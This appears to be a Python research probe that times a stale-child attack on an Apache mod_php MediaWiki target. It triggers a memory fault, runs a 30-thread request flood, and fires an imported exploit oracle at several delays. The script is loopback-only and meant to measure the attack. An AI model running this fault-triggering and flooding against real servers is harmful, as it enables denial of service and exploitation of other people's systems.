#!/usr/bin/env python3
"""cb-B under-load probe (GLM5-ToB): on the mediawiki :8104 lane, mark an
apache mod_php child stale via the producer OOM, then fire the walk
oracle after a delay D while a background flood (30 concurrent GETs)
runs. Measures the stale-child attack window: delivered rate vs delay.
Reuses matrixbleed primitives. Loopback-only."""
import sys
import time
import threading
import base64
import http.client
import random

sys.path.insert(0, "lanes/race-618/glm5")
import matrixbleed as M

T = M.TARGETS["mediawiki"]
CONT, HOST, PORT, PATH, OWNER = T


def flooder(stop, n=30):
    def one():
        while not stop.is_set():
            try:
                c = http.client.HTTPConnection(HOST, PORT, timeout=4)
                c.request("GET", "/index.php?cb=%d" % random.randint(0, 1 << 30))
                c.getresponse().read()
                c.close()
            except Exception:
                pass
    ts = [threading.Thread(target=one, daemon=True) for _ in range(n)]
    for t in ts:
        t.start()
    return ts


def trial(delay, rounds=3, flooded=True):
    hits = 0
    for _ in range(rounds):
        alloc, sid, logsrc = M.producer_fire(CONT, HOST, PORT, PATH, big=M.BIG, owner=OWNER)
        if alloc is None:
            continue  # no fatal -> no stale child marked this try
        time.sleep(delay)
        delivered, rt = M.walk_oracle(CONT, HOST, PORT, PATH, owner=OWNER)
        hits += bool(delivered)
    return hits, rounds


def main():
    print("baseline (no flood): producer stale-mark then immediate walk")
    h, r = trial(0, rounds=4, flooded=False)
    print(f"  delay 0s : delivered {h}/{r}")
    stop = None
    for delay in (1, 3, 6, 12, 24):
        stop = threading.Event()
        flooder(stop)
        h, r = trial(delay, rounds=3)
        print(f"  delay {delay:>2}s under 30-concurrent flood: delivered {h}/{r}")
        stop.set()
    print("[*] window = last delay with delivered>0 (probabilistic - more rounds "
          "sharpen; stale children are BUSY under flood, not dead)")


if __name__ == "__main__":
    main()
